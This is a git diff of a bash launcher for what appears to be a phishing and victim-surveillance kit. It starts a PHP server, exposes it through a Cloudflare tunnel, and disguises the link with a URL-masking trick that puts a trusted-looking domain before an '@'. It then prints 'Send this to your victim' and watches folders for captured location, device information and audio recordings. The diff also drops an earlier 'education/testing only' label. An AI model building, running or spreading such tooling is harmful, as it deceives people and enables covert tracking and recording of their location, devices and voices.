@@ -128,6 +128,28 @@ else
     type_out "✅ inotify-tools already installed." "$GREEN"
 fi
 
+# === FFmpeg Check ===
+type_out "🔍 Checking for ffmpeg (for audio conversion)..." "$CYAN"
+if ! command -v ffmpeg &> /dev/null; then
+    type_out "❌ ffmpeg not found. Installing..." "$YELLOW"
+
+    if command -v apt &> /dev/null; then
+        sudo apt update && sudo apt install ffmpeg -y
+    elif command -v pkg &> /dev/null; then
+        pkg update && pkg install ffmpeg -y
+    elif command -v apk &> /dev/null; then
+        apk add ffmpeg
+    else
+        echo -e "${RED}⚠️ Could not detect package manager. Please install ffmpeg manually.${NC}"
+        exit 1
+    fi
+
+    type_out "✅ ffmpeg installed successfully." "$GREEN"
+else
+    type_out "✅ ffmpeg already installed." "$GREEN"
+fi
+
+
 
 # === Start PHP Server ===
 echo
@@ -137,7 +159,6 @@ PHP_PID=$!
 sleep 2
 type_out "✅ PHP server running. PID: $PHP_PID" "$GREEN"
 
-# === Start Cloudflare Tunnel ===
 # === Start Cloudflare Tunnel (TryCloudflare) ===
 echo
 type_out "🌐 Creating Cloudflare tunnel..." "$CYAN"
@@ -211,33 +232,48 @@ NC='\033[0m' # No Color
 
 cloudflare_url="$LINK"
 
-# Ask for masking
-echo -e "\n${CYN}❓ Do you want to mask this URL? (y/n)${NC}"
-read -p $'\033[1m> \033[0m' choice
+# === Masking Option ===
+echo -e "\n${CYAN}❓ Do you want to mask this URL? (y/n)${NC}"
+read -p "> " choice
+if [[ "$choice" =~ ^[Yy]$ ]]; then
+    echo -e "${CYAN}🌐 Enter a trusted-looking domain (e.g., https://www.google.com):${NC}"
+    read -p "> " fake_domain
+    echo -e "${CYAN}✏️  Enter a keyword or path (e.g., login-access):${NC}"
+    read -p "> " bait
 
-if [[ "$choice" == "y" || "$choice" == "Y" ]]; then
-    echo -e "${BLU}🌐 Enter a trusted-looking domain (e.g., https://www.google.com):${NC}"
-    read -p $'\033[1m> \033[0m' fake_domain
+    bait_clean=$(echo "$bait" | sed 's/ /-/g' | tr -cd '[:alnum:]-')
+    fake_clean=$(echo "$fake_domain" | sed 's~https\?://~~g' | sed 's:/*$::')
+    base_url=$(echo "$LINK" | sed 's~https\?://~~g' | sed 's:/*$::')
+    masked_url="https://${fake_clean}-${bait_clean}@${base_url}"
 
-    echo -e "${MAG}✏  Enter a keyword or path (e.g., free-access, login-now):${NC}"
-    read -p $'\033[1m> \033[0m' bait
+    echo -e "\n📤 ${RED}Send this to your victim and let them fuck themselves 💣${NC}"
+    echo -e "${YELLOW}╔══════════════════════════════════════════════════════════════════════════╗${NC}"
+    
+    # Padding and box fix to avoid extra characters
+    printf "${CYAN}║  ${BOLD}%-70s${NC}${CYAN}  ║\n" "$masked_url"
 
-    # Sanitize input
-    bait_clean=$(echo "$bait" | sed 's/ /-/g')
-    fake_clean=$(echo "$fake_domain" | sed 's~https\?://~~g')
-    masked_url="${fake_clean}-${bait_clean}@$(echo $cloudflare_url | sed 's~https\?://~~g')"
-
-    echo -e "\n${GRN}🔗 Masked URL (for education/testing only):${NC}"
-    echo -e "${YEL}╔══════════════════════════════════════════════════════════════════════════╗${NC}"
-    printf "${CYN}║  ${BOLD}%-70s${NC}${CYN}║\n" "$masked_url"
-    echo -e "${YEL}╚══════════════════════════════════════════════════════════════════════════╝${NC}"
-
+    echo -e "${YELLOW}╚══════════════════════════════════════════════════════════════════════════╝${NC}"
 else
-    echo -e "\n${GRN}🔗 Direct Public URL:${NC}"
-    echo -e "${YEL}╔══════════════════════════════════════════════════════════════════════════╗${NC}"
-    printf "${CYN}║  ${BOLD}%-70s${NC}${CYN}║\n" "$cloudflare_url"
-    echo -e "${YEL}╚══════════════════════════════════════════════════════════════════════════╝${NC}"
+    echo -e "\n📤 ${RED}Send this to your victim and let them fuck themselves 💣${NC}"
+    echo -e "${YELLOW}╔══════════════════════════════════════════════════════════════════════════╗${NC}"
+    
+    # Padding and box fix
+    printf "${CYAN}║  ${BOLD}%-70s${NC}${CYAN}  ║\n" "$LINK"
+
+    echo -e "${YELLOW}╚══════════════════════════════════════════════════════════════════════════╝${NC}"
 fi
+
+# === Ensure folders exist and have proper permissions ===
+echo -e "${CYAN}📁 Ensuring folders exist and are writable...${NC}"
+for dir in Device_location Device_info uploads audio_uploads; do
+    if [[ ! -d "$dir" ]]; then
+        mkdir -p "$dir"
+        echo -e "${GREEN}✅ Created missing folder: $dir${NC}"
+    fi
+    chmod -R 777 "$dir"
+done
+echo -e "${GREEN}✅ Folder permissions set (777)${NC}"
+
 
 # === Live Folder Notification for location/ and info/ ===
 
@@ -287,4 +323,5 @@ while read path action file; do
         echo -e "${RED}🔊 New Audio received: $file${NC}"
     fi
 done
+
 
